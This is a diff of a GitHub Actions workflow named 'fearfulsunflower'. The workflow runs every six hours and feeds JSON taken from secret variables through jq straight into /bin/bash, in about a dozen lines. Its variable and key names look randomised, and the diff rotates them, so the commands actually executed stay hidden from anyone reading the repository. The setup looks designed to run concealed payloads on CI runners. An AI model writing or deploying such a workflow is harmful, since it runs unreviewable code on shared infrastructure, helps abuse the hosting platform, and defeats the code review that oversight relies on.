@@ -2,26 +2,26 @@ name: fearfulsunflower
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 5/6 * * *'
+    - cron: '42 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fearfulsunflower
         env:
-          ujt497: ${{ secrets.ujt497 }}
+          pz83556: ${{ secrets.pz83556 }}
         run: |
-          echo $ujt497 | jq -r .mk7 | /bin/bash
-          echo $bk666 | jq -r .q62349 | /bin/bash
-          echo $ksynw2 | jq -r .w3 | /bin/bash
-          echo $g436 | jq -r .iqjn42560 | /bin/bash
-          echo $c65 | jq -r .svtvm27121 | /bin/bash
-          echo $ffs65 | jq -r .tws9 | /bin/bash
-          echo $c228 | jq -r .xo48 | /bin/bash
-          echo $n9 | jq -r .wchd9 | /bin/bash
-          echo $gmu0508 | jq -r .qyggy9 | /bin/bash
-          echo $yg5603 | jq -r .llftd30 | /bin/bash
-          echo $yokyw7030 | jq -r .q8 | /bin/bash
+          echo $pz83556 | jq -r .xdyx5 | /bin/bash
+          echo $h42897 | jq -r .a3 | /bin/bash
+          echo $wu41 | jq -r .h1 | /bin/bash
+          echo $ic5 | jq -r .ji016 | /bin/bash
+          echo $ae1086 | jq -r .j8986 | /bin/bash
+          echo $j4 | jq -r .lqwt62 | /bin/bash
+          echo $aua2 | jq -r .vjjz08 | /bin/bash
+          echo $xq8572 | jq -r .olvlz40 | /bin/bash
+          echo $oornv2686 | jq -r .y9 | /bin/bash
+          echo $ckiw1712 | jq -r .nadl03 | /bin/bash
+          echo $epjwk33 | jq -r .miy77928 | /bin/bash
+          echo $qsiwo8 | jq -r .yk6795 | /bin/bash
 
